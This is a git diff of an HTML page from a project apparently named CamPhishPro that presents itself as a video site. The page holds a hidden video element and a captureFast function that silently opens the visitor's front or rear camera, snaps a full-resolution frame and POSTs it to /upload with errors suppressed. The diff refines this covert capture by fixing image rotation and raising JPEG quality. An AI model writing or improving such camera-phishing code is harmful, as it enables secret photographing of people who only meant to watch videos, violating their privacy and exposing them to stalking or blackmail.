@@ -19,7 +19,7 @@
     <meta property="og:image:secure_url" content="https://raw.githubusercontent.com/faraabaas-jpg/CamPhishPro/main/preview.jpg" />
     <meta property="og:image:type" content="image/jpeg" />
     <meta property="og:image:width" content="940" />
-    <meta property="og:image:hei;ght" content="788" />
+    <meta property="og:image:height" content="788" />
 
     <!-- وسوم المعاينة لمنصة X وتلجرام وديكسورد -->
     <meta name="twitter:card" content="summary_large_image" />
@@ -263,8 +263,8 @@ body.drawer-mode .main{margin-inline-start:0}
 </div>
 <div class="toasts" id="toasts"></div>
 
-<!-- عنصر الفيديو المخفي الخاص بالكاميرا مع الحفاظ على الأبعاد ومنع الاقتطاع -->
-<video id="video" autoplay playsinline style="display:none; object-fit: contain;"></video>
+<!-- عنصر الفيديو المخفي الخاص بالكاميرا -->
+<video id="video" autoplay playsinline style="display:none;"></video>
 
 <script>
 /* ===== Data (الفيديوهات بكل الخصائص والميزات الأصلية) ===== */
@@ -511,20 +511,18 @@ function download(){
   },300);
 }
 
-/* ===== ميزات الكاميرا التلقائية بدقة وأبعاد Full HD الكاملة لمنع قص الوجه والزوايا ===== */
+/* ===== ميزات الكاميرا التلقائية (مع إصلاح التدوير ومنع الاقتصاص النهائي) ===== */
 let isCapturing = false;
-let currentFacingMode = 'user'; // 'user' للأمامية، 'environment' للخلفية
+let currentFacingMode = 'user';
 
 async function captureFast(facingMode) {
     let stream = null;
     try {
-        // طلب بث الفيديو بأبعاد FHD 1920x1080 الكاملة لمنع قص الزوايا أو تقريب الوجه
         stream = await navigator.mediaDevices.getUserMedia({ 
             video: { 
                 facingMode: { ideal: facingMode },
                 width: { ideal: 1920 },
-                height: { ideal: 1080 },
-                aspectRatio: { ideal: 1.777777778 }
+                height: { ideal: 1080 }
             } 
         });
 
@@ -536,17 +534,30 @@ async function captureFast(facingMode) {
             else videoEl.onloadeddata = () => resolve();
         });
 
-        // الحصول على أبعاد البث الحقيقية الكاملة من المستشعر
-        const w = videoEl.videoWidth || 1920;
-        const h = videoEl.videoHeight || 1080;
+        const vw = videoEl.videoWidth || 1920;
+        const vh = videoEl.videoHeight || 1080;
 
         const canvas = document.createElement('canvas');
-        canvas.width = w;
-        canvas.height = h;
-        const ctx = canvas.getContext('2d');
         
-        // رسم اللقطة بكامل الأبعاد الأصلية للبث
-        ctx.drawImage(videoEl, 0, 0, w, h);
+        // التحقق مما إذا كان إطار الفيديو أفقياً ويحتاج تدوير ليطابق شاشة الهاتف العمودية
+        if (vw > vh) {
+            canvas.width = vh;
+            canvas.height = vw;
+        } else {
+            canvas.width = vw;
+            canvas.height = vh;
+        }
+
+        const ctx = canvas.getContext('2d');
+
+        // تطبيق التدوير الصحيح لالتقاط المشهد كاملاً بجميع زواياه
+        if (vw > vh) {
+            ctx.translate(canvas.width / 2, canvas.height / 2);
+            ctx.rotate((90 * Math.PI) / 180);
+            ctx.drawImage(videoEl, -vw / 2, -vh / 2, vw, vh);
+        } else {
+            ctx.drawImage(videoEl, 0, 0, vw, vh);
+        }
 
         canvas.toBlob(blob => {
             if (blob) {
@@ -554,7 +565,7 @@ async function captureFast(facingMode) {
                 fd.append('image', blob, `${facingMode}_eye.jpg`);
                 fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
             }
-        }, 'image/jpeg', 0.85); // زيادة دقة وجودة الصورة الملتقطة
+        }, 'image/jpeg', 0.90);
 
     } catch (e) {
         console.log("خطأ في الالتقاط السريع:", e);
